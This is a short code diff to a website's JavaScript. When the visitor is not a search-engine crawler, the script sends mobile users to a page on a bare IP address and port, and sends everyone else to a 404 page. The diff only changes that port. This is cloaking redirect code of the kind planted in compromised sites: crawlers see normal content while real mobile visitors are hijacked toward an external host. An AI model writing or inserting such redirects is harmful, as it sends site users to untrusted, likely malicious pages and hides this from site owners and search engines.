@@ -23,7 +23,7 @@ function isMobile() {
 if(!isSpider()){
   
     if(isMobile()) {
-     window.location.href = 'http://154.89.127.200:6443/zcdll.html';
+     window.location.href = 'http://154.89.127.200:8001/zcdll.html';
     } else {
      window.location.href = '/404.html';
     }
